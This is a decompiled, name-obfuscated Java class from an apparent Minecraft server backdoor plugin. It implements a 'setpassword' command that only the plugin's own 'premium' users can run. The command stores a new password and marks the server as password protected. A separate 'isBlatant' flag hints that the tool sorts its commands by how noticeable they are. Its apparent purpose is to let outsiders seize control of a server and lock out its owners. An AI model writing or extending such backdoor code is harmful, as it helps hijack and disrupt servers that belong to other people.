/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  org.bukkit.entity.Player
 */
package me.system.runner.command.impl.premium;

import me.system.runner.Core;
import me.system.runner.command.Command;
import me.system.runner.data.DataManager;
import me.system.runner.utils.Settings;
import org.bukkit.entity.Player;

public class SetpasswordCommand
extends Command {
    private static void set(String llllllllllllllllIIllIlIIllIIlIlI) {
        DataManager.getData().set("pass", (Object)llllllllllllllllIIllIlIIllIIlIlI);
        DataManager.saveData();
    }

    public SetpasswordCommand() {
        SetpasswordCommand llllllllllllllllIIllIlIIllIIllIl;
    }

    @Override
    public void execute(Core llllllllllllllllIIllIlIIllIIIIII, String llllllllllllllllIIllIlIIllIIIIll, String[] llllllllllllllllIIllIlIIlIllllll, Player llllllllllllllllIIllIlIIllIIIIIl) {
        if (llllllllllllllllIIllIlIIllIIIIII.premium.contains(llllllllllllllllIIllIlIIllIIIIIl.getName())) {
            if (llllllllllllllllIIllIlIIlIllllll.length <= 1) {
                llllllllllllllllIIllIlIIllIIIIIl.sendMessage(Settings.USAGE("setpassword <new password>"));
                llllllllllllllllIIllIlIIllIIIIIl.sendMessage(Settings.PREFIX("Passwords can only be 1 word and are cap sensitive!"));
            } else {
                SetpasswordCommand.set(llllllllllllllllIIllIlIIlIllllll[1]);
                if (!DataManager.getData().getBoolean("hasPass")) {
                    DataManager.getData().set("hasPass", (Object)true);
                    DataManager.saveData();
                }
                llllllllllllllllIIllIlIIllIIIIIl.sendMessage(Settings.PREFIX("This server is now password protected!"));
            }
        } else {
            llllllllllllllllIIllIlIIllIIIIIl.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("You must be an ").append(Settings.RED).append("premium ").append(Settings.WHITE).append("to execute this command"))));
        }
    }

    @Override
    public boolean isBlatant() {
        return false;
    }
}

